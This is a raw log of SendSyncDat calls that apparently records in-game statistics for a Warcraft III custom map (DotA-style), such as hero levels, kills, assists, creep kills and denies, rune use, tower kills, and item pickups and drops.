	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "Level8", 11);
	SendSyncDat("dr.x", "Data", "Hero2", 9);
	SendSyncDat("dr.x", "Data", "Assist7", 2);
	SendSyncDat("dr.x", "Data", "Assist8", 2);
	SendSyncDat("dr.x", "Data", "Assist11", 2);
	SendSyncDat("dr.x", "Data", "Level7", 9);
	SendSyncDat("dr.x", "Data", "Hero4", 10);
	SendSyncDat("dr.x", "Data", "Assist7", 4);
	SendSyncDat("dr.x", "Data", "Assist8", 4);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "Level8", 3);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895874);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227902281);
	SendSyncDat("dr.x", "Data", "Hero3", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 3);
	SendSyncDat("dr.x", "Data", "Assist9", 3);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "Level8", 1);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "CSK1", 25);
	SendSyncDat("dr.x", "Data", "CSD1", 5);
	SendSyncDat("dr.x", "Data", "NK1", 0);
	SendSyncDat("dr.x", "Data", "CSK7", 39);
	SendSyncDat("dr.x", "Data", "CSD7", 4);
	SendSyncDat("dr.x", "Data", "NK7", 0);
	SendSyncDat("dr.x", "Data", "CSK2", 52);
	SendSyncDat("dr.x", "Data", "CSD2", 8);
	SendSyncDat("dr.x", "Data", "NK2", 0);
	SendSyncDat("dr.x", "Data", "CSK8", 34);
	SendSyncDat("dr.x", "Data", "CSD8", 2);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 38);
	SendSyncDat("dr.x", "Data", "CSD3", 6);
	SendSyncDat("dr.x", "Data", "NK3", 0);
	SendSyncDat("dr.x", "Data", "CSK9", 25);
	SendSyncDat("dr.x", "Data", "CSD9", 2);
	SendSyncDat("dr.x", "Data", "NK9", 0);
	SendSyncDat("dr.x", "Data", "CSK4", 12);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 27);
	SendSyncDat("dr.x", "Data", "CSK10", 5);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 35);
	SendSyncDat("dr.x", "Data", "CSD5", 5);
	SendSyncDat("dr.x", "Data", "NK5", 0);
	SendSyncDat("dr.x", "Data", "CSK11", 32);
	SendSyncDat("dr.x", "Data", "CSD11", 3);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "Level8", 9);
	SendSyncDat("dr.x", "Data", "Hero5", 8);
	SendSyncDat("dr.x", "Data", "Assist7", 5);
	SendSyncDat("dr.x", "Data", "Assist11", 5);
	SendSyncDat("dr.x", "Data", "Level11", 7);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227902265);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227900762);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse5", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "Level9", 10);
	SendSyncDat("dr.x", "Data", "Hero1", 10);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "Level10", 8);
	SendSyncDat("dr.x", "Data", "Level9", 11);
	SendSyncDat("dr.x", "Data", "Hero2", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 2);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227900744);
	SendSyncDat("dr.x", "Data", "Level11", 8);
	SendSyncDat("dr.x", "Data", "Hero4", 8);
	SendSyncDat("dr.x", "Data", "Assist7", 4);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895863);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895883);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895890);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "Level10", 10);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "Hero4", 7);
	SendSyncDat("dr.x", "Data", "Level12", 7);
	SendSyncDat("dr.x", "Data", "Level10", 2);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "Hero1", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 1);
	SendSyncDat("dr.x", "Data", "Assist9", 1);
	SendSyncDat("dr.x", "Data", "Level10", 5);
	SendSyncDat("dr.x", "Data", "Hero7", 5);
	SendSyncDat("dr.x", "Data", "Assist1", 7);
	SendSyncDat("dr.x", "Data", "Level11", 5);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "Hero2", 8);
	SendSyncDat("dr.x", "Data", "Assist9", 2);
	SendSyncDat("dr.x", "Data", "Level9", 9);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "Level11", 10);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "Level9", 3);
	SendSyncDat("dr.x", "Data", "Hero9", 3);
	SendSyncDat("dr.x", "Data", "Assist5", 9);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900760);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900760);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227901510);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895883);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "CSK1", 31);
	SendSyncDat("dr.x", "Data", "CSD1", 5);
	SendSyncDat("dr.x", "Data", "NK1", 0);
	SendSyncDat("dr.x", "Data", "CSK7", 54);
	SendSyncDat("dr.x", "Data", "CSD7", 5);
	SendSyncDat("dr.x", "Data", "NK7", 1);
	SendSyncDat("dr.x", "Data", "CSK2", 57);
	SendSyncDat("dr.x", "Data", "CSD2", 8);
	SendSyncDat("dr.x", "Data", "NK2", 0);
	SendSyncDat("dr.x", "Data", "CSK8", 47);
	SendSyncDat("dr.x", "Data", "CSD8", 2);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 51);
	SendSyncDat("dr.x", "Data", "CSD3", 7);
	SendSyncDat("dr.x", "Data", "NK3", 0);
	SendSyncDat("dr.x", "Data", "CSK9", 32);
	SendSyncDat("dr.x", "Data", "CSD9", 2);
	SendSyncDat("dr.x", "Data", "NK9", 0);
	SendSyncDat("dr.x", "Data", "CSK4", 12);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 35);
	SendSyncDat("dr.x", "Data", "CSK10", 17);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 37);
	SendSyncDat("dr.x", "Data", "CSD5", 6);
	SendSyncDat("dr.x", "Data", "NK5", 1);
	SendSyncDat("dr.x", "Data", "CSK11", 36);
	SendSyncDat("dr.x", "Data", "CSD11", 3);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896136);
	SendSyncDat("dr.x", "Data", "Level10", 3);
	SendSyncDat("dr.x", "Data", "Level10", 11);
	SendSyncDat("dr.x", "Data", "Hero3", 7);
	SendSyncDat("dr.x", "Data", "Assist11", 3);
	SendSyncDat("dr.x", "Data", "Level13", 7);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895896);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895895);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227900760);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse2", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "Hero7", 0);
	SendSyncDat("dr.x", "Data", "Assist4", 7);
	SendSyncDat("dr.x", "Data", "Assist5", 7);
	SendSyncDat("dr.x", "Data", "Level9", 4);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227900744);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "Level11", 11);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "Hero4", 8);
	SendSyncDat("dr.x", "Data", "Assist7", 4);
	SendSyncDat("dr.x", "Data", "Level12", 8);
	SendSyncDat("dr.x", "Data", "Hero5", 8);
	SendSyncDat("dr.x", "Data", "Assist7", 5);
	SendSyncDat("dr.x", "Data", "Level11", 2);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "Tower012", 9);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "Level9", 1);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895883);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895877);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896916);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900976);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900976);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227900976);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse3", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227896921);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "RuneUse6", 1);
	SendSyncDat("dr.x", "Data", "PUI_1", 0);
	SendSyncDat("dr.x", "Data", "DRI_1", 0);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "Level13", 8);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895892);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896394);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895894);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895888);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895892);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895894);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895894);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227899469);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896394);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895898);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895893);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227903025);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895892);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895892);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "Hero1", 10);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "Level12", 5);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "Level10", 9);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895895);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895863);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896911);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227895883);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896921);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "Level14", 7);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895861);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227895861);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895861);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227900746);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896131);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "Hero5", 9);
	SendSyncDat("dr.x", "Data", "Assist7", 5);
	SendSyncDat("dr.x", "Data", "Assist11", 5);
	SendSyncDat("dr.x", "Data", "Level11", 9);
	SendSyncDat("dr.x", "Data", "Hero3", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 3);
	SendSyncDat("dr.x", "Data", "Assist11", 3);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "Hero4", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 4);
	SendSyncDat("dr.x", "Data", "Assist11", 4);
	SendSyncDat("dr.x", "Data", "Level15", 7);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227895890);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899225);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227894863);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "Level12", 2);
	SendSyncDat("dr.x", "Data", "Level12", 10);
	SendSyncDat("dr.x", "Data", "RuneUse1", 7);
	SendSyncDat("dr.x", "Data", "PUI_7", 0);
	SendSyncDat("dr.x", "Data", "DRI_7", 0);
	SendSyncDat("dr.x", "Data", "PUI_7", 0);
	SendSyncDat("dr.x", "Data", "DRI_7", 0);
	SendSyncDat("dr.x", "Data", "Tower011", 9);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227895896);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227899192);
	SendSyncDat("dr.x", "Data", "CSK1", 36);
